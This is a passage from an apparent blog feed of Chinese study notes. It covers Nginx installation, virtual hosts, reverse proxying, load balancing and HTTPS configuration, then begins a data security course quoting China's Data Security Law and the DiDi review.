        <content type="html"><![CDATA[<h1 id="Nginx-基础应用实战-04"><a href="#Nginx-基础应用实战-04" class="headerlink" title="Nginx 基础应用实战 04"></a>Nginx 基础应用实战 04</h1><h2 id="在公网配置配置HTTPS"><a href="#在公网配置配置HTTPS" class="headerlink" title="在公网配置配置HTTPS"></a>在公网配置配置HTTPS</h2><h3 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><pre class="line-numbers language-none"><code class="language-none">server {        listen       443 ssl;        server_name  aa.abc.com;        ssl_certificate      /data/cert/server.crt;        ssl_certificate_key  /data/cert/server.key;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="免费签名"><a href="#免费签名" class="headerlink" title="免费签名"></a>免费签名</h3><p><a href="https://freessl.cn/">https://freessl.cn</a></p><p>阿里云</p><p>腾讯云</p><h3 id="Nginx配置-1"><a href="#Nginx配置-1" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><pre class="line-numbers language-none"><code class="language-none">server {    #SSL 访问端口号为 443    listen 443 ssl; #填写绑定证书的域名    server_name duozuiyu.com; #证书文件名称    ssl_certificate duozuiyu.com.crt; #私钥文件名称    ssl_certificate_key duozuiyu.com.key;    location / {    #网站主页路径。此路径仅供参考，具体请您按照实际目录操作。        root html;        index  index.html index.htm;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译时报错</p><pre class="line-numbers language-none"><code class="language-none">nginx: [emerg] the "ssl" parameter requires ngx_http_ssl_module in /usr/local/nginx/conf/nginx.conf:98nginx: configuration file /usr/local/nginx/conf/nginx.conf test failed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决方法：</p><ol><li>重新编译 增加ssl模块</li></ol><pre class="line-numbers language-none"><code class="language-none">./configure --with-http_stub_status_module --with-http_ssl_module<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>执行 make</li></ol><p>​    make执行完之后 不要执行install</p><ol start="2"><li>备份</li><li>替换文件</li><li>启动Nginx</li><li>访问https</li></ol><h2 id="java项目的负载均衡"><a href="#java项目的负载均衡" class="headerlink" title="java项目的负载均衡"></a>java项目的负载均衡</h2><h3 id="反向代理java项目"><a href="#反向代理java项目" class="headerlink" title="反向代理java项目"></a>反向代理java项目</h3><p>1.安装jdk</p><pre class="line-numbers language-none"><code class="language-none">yum install java-1.8.0-openjdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.上传项目</p><p>3.让https反向代理到本机Tomcat</p><pre class="line-numbers language-none"><code class="language-none">proxy_pass http://127.0.0.1:8080;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.负载均衡</p><pre class="line-numbers language-none"><code class="language-none">  upstream httpd {    server 192.168.43.152:80;    server 192.168.43.153:80;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-03-ji-yu-fan-xiang-dai-li-de-fu-zai-jun-heng-https-pei-zhi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-03-ji-yu-fan-xiang-dai-li-de-fu-zai-jun-heng-https-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-基础应用实战-03"><a href="#Nginx-基础应用实战-03" class="headerlink" title="Nginx 基础应用实战 03"></a>Nginx 基础应用实战 03</h1><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><code>proxy_pass http://baidu.com;</code></p><pre class="line-numbers language-none"><code class="language-none">       location /mashibing {          proxy_pass http://mashibing.com/;       }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="基于反向代理的负载均衡"><a href="#基于反向代理的负载均衡" class="headerlink" title="基于反向代理的负载均衡"></a>基于反向代理的负载均衡</h2><pre class="line-numbers language-none"><code class="language-none">  upstream httpd {    server 192.168.43.152:80;    server 192.168.43.153:80;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="weight-权重"><a href="#weight-权重" class="headerlink" title="weight(权重)"></a><strong>weight(权重)</strong></h5><p>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</p><pre class="line-numbers language-none"><code class="language-none">upstream httpds {    server 127.0.0.1:8050       weight=10 down;    server 127.0.0.1:8060       weight=1;     server 127.0.0.1:8060      weight=1 backup;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>down：表示当前的server暂时不参与负载 </li><li>weight：默认为1.weight越大，负载的权重就越大。 </li><li>backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。</li></ul><h2 id="代理服务的安全问题"><a href="#代理服务的安全问题" class="headerlink" title="代理服务的安全问题"></a>代理服务的安全问题</h2><h2 id="在公网配置HTTPS"><a href="#在公网配置HTTPS" class="headerlink" title="在公网配置HTTPS"></a>在公网配置HTTPS</h2><h3 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><pre class="line-numbers language-none"><code class="language-none">server {        listen       443 ssl;        server_name  aa.abc.com;        ssl_certificate      /data/cert/server.crt;        ssl_certificate_key  /data/cert/server.key;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="免费签名"><a href="#免费签名" class="headerlink" title="免费签名"></a>免费签名</h2><p><a href="https://freessl.cn/">https://freessl.cn</a></p><p>阿里云</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-02-yu-ming-dns-xu-ni-zhu-ji/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-02-yu-ming-dns-xu-ni-zhu-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-基础应用实战-02"><a href="#Nginx-基础应用实战-02" class="headerlink" title="Nginx 基础应用实战 02"></a>Nginx 基础应用实战 02</h1><h2 id="域名、dns与http协议"><a href="#域名、dns与http协议" class="headerlink" title="域名、dns与http协议"></a>域名、dns与http协议</h2><p>mashibing.com</p><h2 id="server-相关配置"><a href="#server-相关配置" class="headerlink" title="server 相关配置"></a>server 相关配置</h2><p><code> listen       80;</code>  监听端口<br><code>server_name www.mashibing.com mashibing.com; </code> 域名可以有多个，用空格隔开</p><p><code>charset koi8-r;</code> 编码集</p><p>access_log  logs/host.access.log  main; 日志配置</p><p><code>location </code> URI匹配规则</p><p><code>index index.html index.htm index.jsp;</code> 默认页<br><code>root /data/www/ha97;</code> 主目录</p><h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>虚拟主机是一种特殊的软硬件技术，它可以将网络上的每一台计算机分成多个虚拟主机，每个虚拟主机可以独立对外提供www服务，这样就可以实现一台主机对外提供多个web服务，每个虚拟主机之间是独立的，互不影响的</p><p>通过nginx可以实现虚拟主机的配置，nginx支持三种类型的虚拟主机配置</p><ul><li>基于ip的虚拟主机， （一块主机绑定多个ip地址）</li><li>基于域名的虚拟主机（servername）</li><li>基于端口的虚拟主机（同一ip不同的端口）</li></ul><pre class="line-numbers language-none"><code class="language-none">http{server{#表示一个虚拟主机}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重新加载配置与排查错误"><a href="#重新加载配置与排查错误" class="headerlink" title="重新加载配置与排查错误"></a>重新加载配置与排查错误</h3><p><code>systemctl reload nginx.service</code> 重新加载配置</p><p><code>systemctl status nginx.service -l</code> 查看错误详情</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-01-ke-cheng-da-gang-yu-an-zhuang-bu-shu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-01-ke-cheng-da-gang-yu-an-zhuang-bu-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-基础应用实战-01"><a href="#Nginx-基础应用实战-01" class="headerlink" title="Nginx 基础应用实战 01"></a>Nginx 基础应用实战 01</h1><h2 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h2><ol><li>Nginx基础<ol><li>版本区别与安装</li><li>基础知识<ol><li>Nginx安装部署</li><li>http协议基础</li><li>域名与dns</li></ol></li><li>核心功能与应用场景<ol><li>网站静态资源访问</li><li>虚拟主机</li><li>反向代理服务</li><li>负载均衡</li><li>rewrite</li><li>软防火墙</li><li>Tengine的扩展模块</li></ol></li><li>实战：构建一个可供大家访问的静态网站</li></ol></li><li>高级使用<ol><li>核心配置与调优</li><li>深入http1/2</li><li>Squid</li><li>缓存服务</li><li>日志管理</li><li>高可用 keepalived</li><li>监控管理 zabbix prometheus</li><li>kubernetes集群化管理</li><li>lua语言基础</li><li>openresty扩展模块</li><li>Nginx二次开发</li><li>实战：构建高性能、高可用、高并发的亿级流量网关系统</li></ol></li></ol><h2 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h2><p>常用版本分为四大阵营</p><ul><li>Nginx开源版</li></ul><p><a href="http://nginx.org/">http://nginx.org/</a></p><ul><li>Nginx plus 商业版</li></ul><p><a href="https://www.nginx.com/">https://www.nginx.com</a></p><ul><li>openresty</li></ul><p><a href="http://openresty.org/cn/">http://openresty.org/cn/</a></p><ul><li>Tengine</li></ul><p><a href="http://tengine.taobao.org/">http://tengine.taobao.org/</a></p><h2 id="课前准备"><a href="#课前准备" class="headerlink" title="课前准备"></a>课前准备</h2><h3 id="虚拟机中标准安装CentOS7-6"><a href="#虚拟机中标准安装CentOS7-6" class="headerlink" title="虚拟机中标准安装CentOS7.6"></a>虚拟机中标准安装CentOS7.6</h3><p>CentOS6.x升级到CentOS7.x的注意事项视频<br>1、虚拟机中标准安装CentOS7.6步骤<br>2、XShell远程连接CentOS7.6<br>3、CentOS7.6模板机封装步骤<br>4、VMware虚拟机链接克隆与完全克隆<br>5、VMware虚拟机创建快照和还原快照<br>6、CentOS7.6编译安装Redis-4.0.6例子<br>7、CentOS7.x与CentOS6.x本例中用到几个区别<br>8、CentOS7.6系统优化之SELinux永久关闭<br>9、CentOS7.6 yum安装软件以及Redis配置文件简介<br>10、CentOS7.6创建Redis.service服务实现开机自启动<br>链接: <a href="https://pan.baidu.com/s/1_M0ADqa8LeHrJJTCwTDUpA">https://pan.baidu.com/s/1_M0ADqa8LeHrJJTCwTDUpA</a> 提取码: yhfd</p><p>docker</p><h2 id="Nginx安装"><a href="#Nginx安装" class="headerlink" title="Nginx安装"></a>Nginx安装</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://nginx.org/en/download.html">https://nginx.org/en/download.html</a></p><p>传到虚拟机中并解压缩</p><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p><code>./configure --prefix=/usr/local/nginx</code></p><p><code>make</code></p><p><code>make install</code></p><h3 id="如果出现警告或报错"><a href="#如果出现警告或报错" class="headerlink" title="如果出现警告或报错"></a>如果出现警告或报错</h3><p>提示：</p><pre class="line-numbers language-none"><code class="language-none">./configure: error: the HTTP rewrite module requires the PCRE library.You can either disable the module by using --without-http_rewrite_moduleoption, or install the PCRE library into the system, or build the PCRE librarystatically from the source with nginx by using --with-pcre=&lt;path&gt; option.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装perl库</p><p><code>yum install -y pcre pcre-devel</code></p><p>提示：</p><pre class="line-numbers language-none"><code class="language-none">./configure: error: the HTTP gzip module requires the zlib library.You can either disable the module by using --without-http_gzip_moduleoption, or install the zlib library into the system, or build the zlib librarystatically from the source with nginx by using --with-zlib=&lt;path&gt; option.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装zlib库</p><p><code>yum install -y zlib zlib-devel</code></p><h3 id="启动Nginx"><a href="#启动Nginx" class="headerlink" title="启动Nginx"></a>启动Nginx</h3><p>进入安装好的目录<code>/usr/local/nginx/sbin</code></p><pre class="line-numbers language-none"><code class="language-none">./nginx 启动 ./nginx -s stop 快速停止./nginx -s quit 优雅关闭，在退出前完成已经接受的连接请求./nginx -s reload 重新加载配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于防火墙"><a href="#关于防火墙" class="headerlink" title="关于防火墙"></a>关于防火墙</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p><code>systemctl stop firewalld.service</code></p><h4 id="禁止防火墙开机启动"><a href="#禁止防火墙开机启动" class="headerlink" title="禁止防火墙开机启动"></a>禁止防火墙开机启动</h4><p><code>systemctl disable firewalld.service</code></p><h4 id="放行端口"><a href="#放行端口" class="headerlink" title="放行端口"></a>放行端口</h4><p><code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code></p><h4 id="重启防火墙"><a href="#重启防火墙" class="headerlink" title="重启防火墙"></a>重启防火墙</h4><p><code>firewall-cmd --reload</code></p><h3 id="安装成系统服务"><a href="#安装成系统服务" class="headerlink" title="安装成系统服务"></a>安装成系统服务</h3><p>创建服务脚本</p><p><code>vi /usr/lib/systemd/system/nginx.service</code></p><p>服务脚本内容</p><pre class="line-numbers language-none"><code class="language-none">[Unit]Description=nginx -  web serverAfter=network.target remote-fs.target nss-lookup.target  [Service]Type=forkingPIDFile=/usr/local/nginx/logs/nginx.pidExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.confExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confExecReload=/usr/local/nginx/sbin/nginx -s reloadExecStop=/usr/local/nginx/sbin/nginx -s stopExecQuit=/usr/local/nginx/sbin/nginx -s quitPrivateTmp=true  [Install]WantedBy=multi-user.target<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新加载系统服务</p><p><code>systemctl daemon-reload</code></p><p>启动服务</p><p><code>systemctl start nginx.service</code></p><h4 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h4><p><code>systemctl enable firewalld.service</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/48-shu-ju-an-quan/shu-ju-an-quan-ke-cheng-v2.0/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/48-shu-ju-an-quan/shu-ju-an-quan-ke-cheng-v2.0/</url>
      
        <content type="html"><![CDATA[<h1 id="数据安全课程-v2-0"><a href="#数据安全课程-v2-0" class="headerlink" title="数据安全课程-v2.0"></a>数据安全课程-v2.0</h1><h2 id="前导章节-数据安全法及数据安全事件"><a href="#前导章节-数据安全法及数据安全事件" class="headerlink" title="前导章节 数据安全法及数据安全事件"></a>前导章节 数据安全法及数据安全事件</h2><h3 id="1-《数据安全法》"><a href="#1-《数据安全法》" class="headerlink" title="1.《数据安全法》"></a>1.《数据安全法》</h3><blockquote><p><strong>中华人民共和国数据安全法</strong></p><p><strong>（2021年6月10日第十三届全国人民代表大会常务委员会第二十九次会议通过）</strong></p><p><strong>目录</strong></p><p>第一章 总则</p><p>第二章 数据安全与发展</p><p>第三章 数据安全制度</p><p>第四章 数据安全保护义务</p><p>第五章 政务数据安全与开放</p><p>第六章 法律责任</p><p>第七章 附则</p><p><strong>第一章 总则</strong></p><p>第一条 为了规范数据处理活动，保障数据安全，促进数据开发利用，保护个人、组织的合法权益，维护国家主权、安全和发展利益，制定本法。</p><p>第二条 在中华人民共和国境内开展数据处理活动及其安全监管，适用本法。</p><p>在中华人民共和国境外开展数据处理活动，损害中华人民共和国国家安全、公共利益或者公民、组织合法权益的，依法追究法律责任。</p><p>第三条 本法所称数据，是指任何以电子或者其他方式对信息的记录。</p><p>数据处理，包括数据的收集、存储、使用、加工、传输、提供、公开等。</p><p>数据安全，是指通过采取必要措施，确保数据处于有效保护和合法利用的状态，以及具备保障持续安全状态的能力。</p><p>第四条 维护数据安全，应当坚持总体国家安全观，建立健全数据安全治理体系，提高数据安全保障能力。</p><p>第五条 中央国家安全领导机构负责国家数据安全工作的决策和议事协调，研究制定、指导实施国家数据安全战略和有关重大方针政策，统筹协调国家数据安全的重大事项和重要工作，建立国家数据安全工作协调机制。</p><p>第六条 各地区、各部门对本地区、本部门工作中收集和产生的数据及数据安全负责。</p><p>工业、电信、交通、金融、自然资源、卫生健康、教育、科技等主管部门承担本行业、本领域数据安全监管职责。</p><p>公安机关、国家安全机关等依照本法和有关法律、行政法规的规定，在各自职责范围内承担数据安全监管职责。</p><p>国家网信部门依照本法和有关法律、行政法规的规定，负责统筹协调网络数据安全和相关监管工作。</p><p>第七条 国家保护个人、组织与数据有关的权益，鼓励数据依法合理有效利用，保障数据依法有序自由流动，促进以数据为关键要素的数字经济发展。</p><p>第八条 开展数据处理活动，应当遵守法律、法规，尊重社会公德和伦理，遵守商业道德和职业道德，诚实守信，履行数据安全保护义务，承担社会责任，不得危害国家安全、公共利益，不得损害个人、组织的合法权益。</p><p>第九条 国家支持开展数据安全知识宣传普及，提高全社会的数据安全保护意识和水平，推动有关部门、行业组织、科研机构、企业、个人等共同参与数据安全保护工作，形成全社会共同维护数据安全和促进发展的良好环境。</p><p>第十条 相关行业组织按照章程，依法制定数据安全行为规范和团体标准，加强行业自律，指导会员加强数据安全保护，提高数据安全保护水平，促进行业健康发展。</p><p>第十一条 国家积极开展数据安全治理、数据开发利用等领域的国际交流与合作，参与数据安全相关国际规则和标准的制定，促进数据跨境安全、自由流动。</p><p>第十二条 任何个人、组织都有权对违反本法规定的行为向有关主管部门投诉、举报。收到投诉、举报的部门应当及时依法处理。</p><p>有关主管部门应当对投诉、举报人的相关信息予以保密，保护投诉、举报人的合法权益。</p><p><strong>第二章 数据安全与发展</strong></p><p>第十三条 国家统筹发展和安全，坚持以数据开发利用和产业发展促进数据安全，以数据安全保障数据开发利用和产业发展。</p><p>第十四条 国家实施大数据战略，推进数据基础设施建设，鼓励和支持数据在各行业、各领域的创新应用。</p><p>省级以上人民政府应当将数字经济发展纳入本级国民经济和社会发展规划，并根据需要制定数字经济发展规划。</p><p>第十五条 国家支持开发利用数据提升公共服务的智能化水平。提供智能化公共服务，应当充分考虑老年人、残疾人的需求，避免对老年人、残疾人的日常生活造成障碍。</p><p>第十六条 国家支持数据开发利用和数据安全技术研究，鼓励数据开发利用和数据安全等领域的技术推广和商业创新，培育、发展数据开发利用和数据安全产品、产业体系。</p><p>第十七条 国家推进数据开发利用技术和数据安全标准体系建设。国务院标准化行政主管部门和国务院有关部门根据各自的职责，组织制定并适时修订有关数据开发利用技术、产品和数据安全相关标准。国家支持企业、社会团体和教育、科研机构等参与标准制定。</p><p>第十八条 国家促进数据安全检测评估、认证等服务的发展，支持数据安全检测评估、认证等专业机构依法开展服务活动。</p><p>国家支持有关部门、行业组织、企业、教育和科研机构、有关专业机构等在数据安全风险评估、防范、处置等方面开展协作。</p><p>第十九条 国家建立健全数据交易管理制度，规范数据交易行为，培育数据交易市场。</p><p>第二十条 国家支持教育、科研机构和企业等开展数据开发利用技术和数据安全相关教育和培训，采取多种方式培养数据开发利用技术和数据安全专业人才，促进人才交流。</p><p><strong>第三章 数据安全制度</strong></p><p>第二十一条 国家建立数据分类分级保护制度，根据数据在经济社会发展中的重要程度，以及一旦遭到篡改、破坏、泄露或者非法获取、非法利用，对国家安全、公共利益或者个人、组织合法权益造成的危害程度，对数据实行分类分级保护。国家数据安全工作协调机制统筹协调有关部门制定重要数据目录，加强对重要数据的保护。</p><p>关系国家安全、国民经济命脉、重要民生、重大公共利益等数据属于国家核心数据，实行更加严格的管理制度。</p><p>各地区、各部门应当按照数据分类分级保护制度，确定本地区、本部门以及相关行业、领域的重要数据具体目录，对列入目录的数据进行重点保护。</p><p>第二十二条 国家建立集中统一、高效权威的数据安全风险评估、报告、信息共享、监测预警机制。国家数据安全工作协调机制统筹协调有关部门加强数据安全风险信息的获取、分析、研判、预警工作。</p><p>第二十三条 国家建立数据安全应急处置机制。发生数据安全事件，有关主管部门应当依法启动应急预案，采取相应的应急处置措施，防止危害扩大，消除安全隐患，并及时向社会发布与公众有关的警示信息。</p><p>第二十四条 国家建立数据安全审查制度，对影响或者可能影响国家安全的数据处理活动进行国家安全审查。</p><p>依法作出的安全审查决定为最终决定。</p><p>第二十五条 国家对与维护国家安全和利益、履行国际义务相关的属于管制物项的数据依法实施出口管制。</p><p>第二十六条 任何国家或者地区在与数据和数据开发利用技术等有关的投资、贸易等方面对中华人民共和国采取歧视性的禁止、限制或者其他类似措施的，中华人民共和国可以根据实际情况对该国家或者地区对等采取措施。</p><p><strong>第四章 数据安全保护义务</strong></p><p>第二十七条 开展数据处理活动应当依照法律、法规的规定，建立健全全流程数据安全管理制度，组织开展数据安全教育培训，采取相应的技术措施和其他必要措施，保障数据安全。利用互联网等信息网络开展数据处理活动，应当在网络安全等级保护制度的基础上，履行上述数据安全保护义务。</p><p>重要数据的处理者应当明确数据安全负责人和管理机构，落实数据安全保护责任。</p><p>第二十八条 开展数据处理活动以及研究开发数据新技术，应当有利于促进经济社会发展，增进人民福祉，符合社会公德和伦理。</p><p>第二十九条 开展数据处理活动应当加强风险监测，发现数据安全缺陷、漏洞等风险时，应当立即采取补救措施；发生数据安全事件时，应当立即采取处置措施，按照规定及时告知用户并向有关主管部门报告。</p><p>第三十条 重要数据的处理者应当按照规定对其数据处理活动定期开展风险评估，并向有关主管部门报送风险评估报告。</p><p>风险评估报告应当包括处理的重要数据的种类、数量，开展数据处理活动的情况，面临的数据安全风险及其应对措施等。</p><p>第三十一条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的重要数据的出境安全管理，适用《中华人民共和国网络安全法》的规定；其他数据处理者在中华人民共和国境内运营中收集和产生的重要数据的出境安全管理办法，由国家网信部门会同国务院有关部门制定。</p><p>第三十二条 任何组织、个人收集数据，应当采取合法、正当的方式，不得窃取或者以其他非法方式获取数据。</p><p>法律、行政法规对收集、使用数据的目的、范围有规定的，应当在法律、行政法规规定的目的和范围内收集、使用数据。</p><p>第三十三条 从事数据交易中介服务的机构提供服务，应当要求数据提供方说明数据来源，审核交易双方的身份，并留存审核、交易记录。</p><p>第三十四条 法律、行政法规规定提供数据处理相关服务应当取得行政许可的，服务提供者应当依法取得许可。</p><p>第三十五条 公安机关、国家安全机关因依法维护国家安全或者侦查犯罪的需要调取数据，应当按照国家有关规定，经过严格的批准手续，依法进行，有关组织、个人应当予以配合。</p><p>第三十六条 中华人民共和国主管机关根据有关法律和中华人民共和国缔结或者参加的国际条约、协定，或者按照平等互惠原则，处理外国司法或者执法机构关于提供数据的请求。非经中华人民共和国主管机关批准，境内的组织、个人不得向外国司法或者执法机构提供存储于中华人民共和国境内的数据。</p><p><strong>第五章 政务数据安全与开放</strong></p><p>第三十七条 国家大力推进电子政务建设，提高政务数据的科学性、准确性、时效性，提升运用数据服务经济社会发展的能力。</p><p>第三十八条 国家机关为履行法定职责的需要收集、使用数据，应当在其履行法定职责的范围内依照法律、行政法规规定的条件和程序进行；对在履行职责中知悉的个人隐私、个人信息、商业秘密、保密商务信息等数据应当依法予以保密，不得泄露或者非法向他人提供。</p><p>第三十九条 国家机关应当依照法律、行政法规的规定，建立健全数据安全管理制度，落实数据安全保护责任，保障政务数据安全。</p><p>第四十条 国家机关委托他人建设、维护电子政务系统，存储、加工政务数据，应当经过严格的批准程序，并应当监督受托方履行相应的数据安全保护义务。受托方应当依照法律、法规的规定和合同约定履行数据安全保护义务，不得擅自留存、使用、泄露或者向他人提供政务数据。</p><p>第四十一条 国家机关应当遵循公正、公平、便民的原则，按照规定及时、准确地公开政务数据。依法不予公开的除外。</p><p>第四十二条 国家制定政务数据开放目录，构建统一规范、互联互通、安全可控的政务数据开放平台，推动政务数据开放利用。</p><p>第四十三条 法律、法规授权的具有管理公共事务职能的组织为履行法定职责开展数据处理活动，适用本章规定。</p><p><strong>第六章 法律责任</strong></p><p>第四十四条 有关主管部门在履行数据安全监管职责中，发现数据处理活动存在较大安全风险的，可以按照规定的权限和程序对有关组织、个人进行约谈，并要求有关组织、个人采取措施进行整改，消除隐患。</p><p>第四十五条 开展数据处理活动的组织、个人不履行本法第二十七条、第二十九条、第三十条规定的数据安全保护义务的，由有关主管部门责令改正，给予警告，可以并处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万元以上十万元以下罚款；拒不改正或者造成大量数据泄露等严重后果的，处五十万元以上二百万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五万元以上二十万元以下罚款。</p><p>违反国家核心数据管理制度，危害国家主权、安全和发展利益的，由有关主管部门处二百万元以上一千万元以下罚款，并根据情况责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照；构成犯罪的，依法追究刑事责任。</p><p>第四十六条 违反本法第三十一条规定，向境外提供重要数据的，由有关主管部门责令改正，给予警告，可以并处十万元以上一百万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万元以上十万元以下罚款；情节严重的，处一百万元以上一千万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处十万元以上一百万元以下罚款。</p><p>第四十七条 从事数据交易中介服务的机构未履行本法第三十三条规定的义务的，由有关主管部门责令改正，没收违法所得，处违法所得一倍以上十倍以下罚款，没有违法所得或者违法所得不足十万元的，处十万元以上一百万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第四十八条 违反本法第三十五条规定，拒不配合数据调取的，由有关主管部门责令改正，给予警告，并处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>违反本法第三十六条规定，未经主管机关批准向外国司法或者执法机构提供数据的，由有关主管部门给予警告，可以并处十万元以上一百万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万元以上十万元以下罚款；造成严重后果的，处一百万元以上五百万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五万元以上五十万元以下罚款。</p><p>第四十九条 国家机关不履行本法规定的数据安全保护义务的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>第五十条 履行数据安全监管职责的国家工作人员玩忽职守、滥用职权、徇私舞弊的，依法给予处分。</p><p>第五十一条 窃取或者以其他非法方式获取数据，开展数据处理活动排除、限制竞争，或者损害个人、组织合法权益的，依照有关法律、行政法规的规定处罚。</p><p>第五十二条 违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p><strong>第七章 附则</strong></p><p>第五十三条 开展涉及国家秘密的数据处理活动，适用《中华人民共和国保守国家秘密法》等法律、行政法规的规定。</p><p>在统计、档案工作中开展数据处理活动，开展涉及个人信息的数据处理活动，还应当遵守有关法律、行政法规的规定。</p><p>第五十四条 军事数据安全保护的办法，由中央军事委员会依据本法另行制定。</p><p>第五十五条 本法自2021年9月1日起施行。</p></blockquote><h3 id="2-数据安全事件–DD打车事件"><a href="#2-数据安全事件–DD打车事件" class="headerlink" title="2. 数据安全事件–DD打车事件"></a>2. 数据安全事件–DD打车事件</h3><blockquote><p>​2021年6月30日，滴滴正式在美国纽交所挂牌上市。7月2日晚，国家网信办官网发布公告，网络安全审查办公室宣布对滴滴出行启动网络安全审查，一时间掀起巨大争议。</p><p>​网络安全审查办公室关于对“滴滴出行”启动网络安全审查的公告，<em>为防范国家数据安全风险，维护国家安全，保障公共利益，</em>依据《中华人民共和国国家安全法》《中华人民共和国网络安全法》，网络安全审查办公室按照《网络安全审查办法》，对滴滴出行实施网络安全审查。<em>为配合网络安全审查工作，防范风险扩大，审查期间滴滴出行停止新用户注册。</em>随后，滴滴回应称将积极配合。</p></blockquote><h2 id="第一章-数据与数据库"><a href="#第一章-数据与数据库" class="headerlink" title="第一章 数据与数据库"></a>第一章 数据与数据库</h2><h3 id="1-什么是数据？"><a href="#1-什么是数据？" class="headerlink" 